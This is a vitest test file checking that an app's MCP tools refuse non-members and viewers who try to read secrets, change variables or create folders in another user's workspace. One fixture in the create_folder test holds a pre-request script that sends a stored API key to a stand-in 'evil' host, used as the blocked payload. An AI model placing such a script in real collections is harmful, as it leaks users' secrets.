import { beforeAll, describe, expect, it } from "vitest";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import type { UserRow } from "@/server/db/schema";
import type { Caller } from "@/server/caller";
import type { KeyScope } from "@/core/scopes";

const dir = fs.mkdtempSync(path.join(os.tmpdir(), "postbox-mcp-authz-"));
process.env.DATABASE_PATH = path.join(dir, "test.db");
const { getSqlite } = await import("@/server/db");
const users = await import("@/server/users");
const repo = await import("@/server/repo");
const { withCaller } = await import("@/server/access-context");
const { setMember } = await import("@/server/authorize");
const { MCP_POLICIES, MCP_ID_FIELDS, MCP_CONTEXTUAL_ID_FIELDS, MCP_SCOPED_ID_FIELDS, isIdArgument } =
  await import("@/server/access-policy");
const { createPostboxMcpServer } = await import("@/server/mcp");
const mcpRoute = await import("@/app/api/mcp/route");

const caller = (user: UserRow): Caller => ({ kind: "user", user, via: "token" });
let victim: UserRow, outsider: UserRow, viewer: UserRow, editor: UserRow;
let workspaceId: string, outsiderWorkspaceId: string, envId: string, collectionId: string;

function token(user: UserRow, scope: KeyScope) {
  return users.createToken(user.id, `${scope} key`, null, { scope }).token;
}

async function call(bearer: string, name: string, args: Record<string, unknown>) {
  const response = await mcpRoute.POST(
    new Request("http://localhost/api/mcp", {
      method: "POST",
      headers: {
        authorization: `Bearer ${bearer}`,
        "content-type": "application/json",
        accept: "application/json, text/event-stream",
      },
      body: JSON.stringify({
        jsonrpc: "2.0",
        id: 1,
        method: "tools/call",
        params: { name, arguments: args },
      }),
    }),
  );
  const text = await response.text();
  const json = JSON.parse(text.startsWith("event:") ? text.split("data: ")[1] : text);
  return { isError: Boolean(json.result?.isError), body: JSON.parse(json.result.content[0].text) };
}

const secretValue = () =>
  withCaller(caller(victim), () => repo.listVariables(workspaceId, "environment", envId)).find(
    (v) => v.key === "apiKey",
  );
const plantedFolders = () =>
  (getSqlite().prepare("SELECT count(*) AS n FROM folders WHERE name = 'planted'").get() as { n: number }).n;

beforeAll(async () => {
  await users.createUser({ username: "admin", password: "password123", isAdmin: true });
  victim = await users.createUser({ username: "victim", password: "password123" });
  outsider = await users.createUser({ username: "outsider", password: "password123" });
  viewer = await users.createUser({ username: "viewer", password: "password123" });
  editor = await users.createUser({ username: "editor", password: "password123" });
  withCaller(caller(victim), () => {
    workspaceId = repo.createWorkspace("Victim WS").id;
    setMember(workspaceId, viewer.username, "viewer");
    setMember(workspaceId, editor.username, "editor");
    envId = repo.createEnvironment(workspaceId, "Prod", [
      { key: "apiKey", value: "s3cr3t-prod", type: "secret", enabled: true },
    ]).id;
    collectionId = repo.createFolder(workspaceId, null, { name: "Victim API" }).id;
  });
  outsiderWorkspaceId = withCaller(caller(outsider), () => repo.createWorkspace("Outsider WS").id);
});

describe("MCP tools that name a resource by ownerId or parentId", () => {
  it("refuses a non-member who reads secrets through list_variables", async () => {
    for (const [scope, ownerId] of [
      ["environment", envId],
      ["collection", collectionId],
    ]) {
      const res = await call(token(outsider, "read"), "list_variables", {
        scope,
        ownerId,
        includeSecrets: true,
      });
      expect(res.body.status).toBe(404);
      expect(JSON.stringify(res.body)).not.toContain("s3cr3t-prod");
    }
  });

  it("refuses a non-member or viewer who writes through set_variables", async () => {
    for (const [scope, ownerId] of [
      ["environment", envId],
      ["collection", collectionId],
    ]) {
      const args = { scope, ownerId, variables: [{ key: "apiKey", value: "pwned" }] };
      expect((await call(token(outsider, "write"), "set_variables", args)).body.status).toBe(404);
      expect((await call(token(viewer, "write"), "set_variables", args)).body.status).toBe(403);
    }
    expect(secretValue()).toMatchObject({ value: "s3cr3t-prod", type: "secret" });
  });

  it("refuses a non-member or viewer who plants a folder through create_folder", async () => {
    const args = {
      parentId: collectionId,
      name: "planted",
      preRequestScript: "pm.sendRequest('http://evil/' + pm.environment.get('apiKey'))",
    };
    expect((await call(token(outsider, "write"), "create_folder", args)).body.status).toBe(404);
    expect((await call(token(viewer, "write"), "create_folder", args)).body.status).toBe(403);
    // Naming their own workspace does not let a foreign parent through.
    const mixed = await call(token(outsider, "write"), "create_folder", {
      ...args,
      workspaceId: outsiderWorkspaceId,
    });
    expect(mixed.body.status).toBe(404);
    expect(plantedFolders()).toBe(0);
  });

  it("still refuses get_environment for a non-member", async () => {
    const res = await call(token(outsider, "read"), "get_environment", { environmentId: envId });
    expect(res.body.status).toBe(404);
  });

  it("refuses a resource ID it cannot place instead of falling back to another workspace", async () => {
    const res = await call(token(outsider, "read"), "list_variables", { scope: "bogus", ownerId: envId });
    expect(res.isError).toBe(true);
    expect(JSON.stringify(res.body)).not.toContain("s3cr3t-prod");
  });

  it("lets an editor of the target workspace use the same calls", async () => {
    const key = token(editor, "write");
    const listed = await call(key, "list_variables", {
      scope: "environment",
      ownerId: envId,
      includeSecrets: true,
    });
    expect(listed.isError).toBe(false);
    expect(listed.body.variables).toEqual([expect.objectContaining({ key: "apiKey", value: "s3cr3t-prod" })]);

    const set = await call(key, "set_variables", {
      scope: "collection",
      ownerId: collectionId,
      variables: [{ key: "baseUrl", value: "https://api.example" }],
    });
    expect(set.isError).toBe(false);
    expect(set.body).toMatchObject({ workspaceId, ownerId: collectionId });

    const created = await call(key, "create_folder", { parentId: collectionId, name: "Editor folder" });
    expect(created.isError).toBe(false);
    expect(created.body).toMatchObject({ name: "Editor folder" });
  });

  it("rejects an explicit workspaceId that does not match the named resource", async () => {
    const res = await call(token(editor, "write"), "set_variables", {
      workspaceId: outsiderWorkspaceId,
      scope: "environment",
      ownerId: envId,
      variables: [{ key: "apiKey", value: "x" }],
    });
    expect(res.isError).toBe(true);
    expect(secretValue()).toMatchObject({ value: "s3cr3t-prod" });
  });
});

describe("MCP authorization coverage", () => {
  const tools = Object.entries(
    (createPostboxMcpServer() as unknown as { _registeredTools: Record<string, { inputSchema?: unknown }> })
      ._registeredTools,
  );
  const keysOf = (schema: unknown): string[] => {
    const s = schema as { shape?: Record<string, unknown>; _def?: { shape?: () => Record<string, unknown> } };
    return Object.keys(s?.shape ?? s?._def?.shape?.() ?? {});
  };

  it("resolves every ID argument of every tool to a workspace (or a parent that is resolved)", () => {
    expect(tools.length).toBeGreaterThan(100);
    const uncovered: string[] = [];
    for (const [name, tool] of tools) {
      const action = MCP_POLICIES[name];
      if (action === "list" || action === "create" || action === "identity") continue;
      for (const key of keysOf(tool.inputSchema).filter(isIdArgument)) {
        if (
          key in MCP_ID_FIELDS ||
          MCP_CONTEXTUAL_ID_FIELDS[name]?.includes(key) ||
          MCP_SCOPED_ID_FIELDS[name]?.includes(key)
        )
          continue;
        uncovered.push(`${name}.${key}`);
      }
    }
    expect(uncovered, "add these arguments to authorizeTool in src/server/access-policy.ts").toEqual([]);
  });

  it("keeps the per-tool ID lists in step with the registered tools", () => {
    const schemas = new Map(tools.map(([name, tool]) => [name, keysOf(tool.inputSchema)]));
    for (const table of [MCP_CONTEXTUAL_ID_FIELDS, MCP_SCOPED_ID_FIELDS])
      for (const [name, keys] of Object.entries(table))
        for (const key of keys) expect(schemas.get(name), `${name}.${key}`).toContain(key);
  });
});
